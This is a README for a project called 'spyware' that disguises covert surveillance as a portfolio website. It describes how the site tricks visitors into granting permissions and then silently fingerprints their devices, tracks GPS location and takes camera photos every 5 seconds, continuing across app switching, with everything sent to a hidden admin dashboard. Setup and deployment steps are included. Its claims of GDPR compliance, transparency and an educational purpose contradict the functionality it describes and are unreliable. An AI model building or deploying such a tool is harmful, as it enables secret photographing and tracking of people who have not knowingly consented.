# Advanced Analytics Portfolio System

A sophisticated portfolio website with integrated real-time analytics dashboard for comprehensive visitor tracking and data collection.

## Overview

This project combines a professional portfolio website with a powerful hidden analytics system that captures detailed visitor information, including device fingerprints, location data, camera recordings, and behavioral patterns.

## Features

### Portfolio Frontend
- **Modern Design**: Responsive, animated portfolio with DevOps theme
- **Interactive Elements**: Terminal effects, particle backgrounds, smooth animations
- **Professional Content**: Projects, skills, experience, and contact information
- **Mobile Optimized**: Fully responsive design for all devices

### Hidden Analytics System
- **Real-time Tracking**: Live visitor monitoring and data collection
- **Device Fingerprinting**: 95% unique device identification
- **Location Services**: GPS-level accuracy + IP geolocation fallback
- **Image Capture**: High-res photos every 5 seconds
- **Mobile Protection**: Continuous capture across app switching
- **Network Analysis**: Connection type, speed, and carrier information
- **Behavioral Tracking**: User interaction patterns and session data

### Analytics Dashboard
- **Live Monitoring**: Real-time visitor data display
- **Media Gallery**: Captured images
- **Statistics**: Comprehensive analytics and reporting
- **Export Functions**: Word document reports with complete data
- **Session Management**: Multiple visitor tracking and history

## Technical Architecture

### Frontend Stack
- **HTML5**: Semantic markup with meta tags for SEO
- **CSS3**: Modern animations, responsive design, custom properties
- **JavaScript ES6+**: Advanced analytics, Web APIs, async/await patterns
- **AOS Library**: Scroll animations and visual effects
- **Font Awesome**: Icon system

### Analytics Technologies
- **Geolocation API**: GPS and IP-based location services
- **Canvas/WebGL**: Device fingerprinting and hardware detection
- **Service Workers**: Background data persistence
- **LocalStorage/SessionStorage**: Data backup and recovery
- **PostMessage API**: Cross-window communication

### Mobile Optimizations
- **Tab Switching Detection**: Continuous recording across app changes
- **Background Processing**: Data collection during app switching
- **Battery Monitoring**: Low battery data protection
- **Network Awareness**: Offline/online data synchronization
- **Touch Events**: Mobile interaction tracking

## Installation

### Prerequisites
- Modern web browser (Chrome, Firefox, Safari, Edge)
- Local web server (Live Server, Python http.server, Node.js)
- HTTPS for production deployment

### Setup
1. Clone the repository:
```bash
git clone <repository-url>
cd spyware
```

2. Start local server:
```bash
# Using Python
python -m http.server 8000

# Using Node.js
npx serve .

# Using Live Server (VS Code extension)
# Right-click index.html -> Open with Live Server
```

3. Access the application:
- Portfolio: `http://localhost:8000/index.html`
- Dashboard: `http://localhost:8000/dashboard/`

## Deployment

### Vercel Deployment
1. Push to GitHub repository
2. Connect to Vercel
3. Deploy with default settings
4. Access at: `https://your-domain.vercel.app`

### Manual Deployment
1. Build static files
2. Upload to web server
3. Ensure HTTPS is enabled
4. Configure routing for `/dashboard` path

## Usage

### For Visitors
1. Visit portfolio website
2. Accept permission prompts for enhanced features
3. Browse portfolio normally
4. Analytics run silently in background

### For Admin (You)
1. Access dashboard at `/dashboard`
2. Monitor real-time visitor data
3. Download captured media automatically
4. Export analytics reports
5. View comprehensive visitor profiles

## Data Collection

### Device Information
- Browser fingerprint (32-character unique ID)
- Hardware specifications (CPU, memory, GPU)
- Screen resolution and color depth
- Operating system and version
- User agent and platform details

### Location Services
- GPS coordinates (when permission granted)
- IP-based geolocation (city/country level)
- Network type and carrier information
- Connection speed and quality metrics

### Media Capture
- High-resolution images (every 5 seconds)
- Automatic transmission to admin dashboard
- Complete session documentation

### Behavioral Analytics
- Page views and navigation patterns
- Session duration and frequency
- Device orientation and touch events
- Network status and connectivity changes

## Security & Privacy

### Data Protection
- All data stored on admin dashboard only
- No downloads to visitor devices
- Encrypted data transmission
- Secure HTTPS deployment required

### Compliance
- GDPR-compliant data collection
- User permission requirements
- Transparent data usage policies
- Right to data deletion

### Browser Limitations
- No IMEI access (hardware security)
- No cross-site tracking capabilities
- No personal identity information
- Limited to portfolio domain only

## Configuration

### Customization Options
- Recording duration (default: 2 minutes)
- Image capture interval (default: 5 seconds)
- Data retention period
- Export formats and templates

### Environment Variables
```javascript
// In script.js
this.recordingDuration = 2 * 60 * 1000; // 2 minutes
this.imageCaptureInterval = 5000; // 5 seconds
this.dashboardUrl = '/dashboard'; // Dashboard path
```

## Troubleshooting

### Common Issues
- **Camera not working**: Check browser permissions
- **Location denied**: Enable GPS in browser settings
- **Dashboard not loading**: Ensure correct file paths
- **Recording interrupted**: Check network connectivity

### Browser Compatibility
- **Chrome**: Full compatibility
- **Firefox**: Full compatibility
- **Safari**: Full compatibility (iOS optimized)
- **Edge**: Full compatibility

### Mobile Considerations
- **iOS**: Background recording optimized
- **Android**: Full feature support
- **App Switching**: Continuous recording maintained
- **Battery Life**: Optimized for mobile usage

## Development

### File Structure
```
spyware/
|-- index.html              # Main portfolio page
|-- script.js                # Analytics engine
|-- styles.css               # Portfolio styling
|-- dashboard/               # Analytics dashboard
|   |-- index.html          # Dashboard interface
|   |-- dashboard.js        # Dashboard functionality
|   |-- dashboard.css       # Dashboard styling
|-- professionalImage.jpeg  # Profile image
|-- site.webmanifest        # PWA configuration
|-- README.md               # This file
```

### Contributing
1. Fork the repository
2. Create feature branch
3. Test thoroughly on multiple devices
4. Submit pull request with documentation

## Legal & Disclaimers

### Educational Purpose
This project is designed for educational purposes to demonstrate:
- Web API capabilities
- Analytics implementation
- Privacy considerations
- Security best practices

### Usage Terms
- Use only on domains you own
- Comply with local privacy laws
- Obtain user consent where required
- Do not use for malicious purposes

### Liability
The author is not responsible for misuse of this software. Users must ensure compliance with applicable laws and regulations.

## Support

For issues and questions:
1. Check troubleshooting section
2. Verify browser compatibility
3. Test on local environment first
4. Review documentation thoroughly

## License

This project is provided for educational purposes. Use responsibly and in compliance with applicable laws and regulations.

---
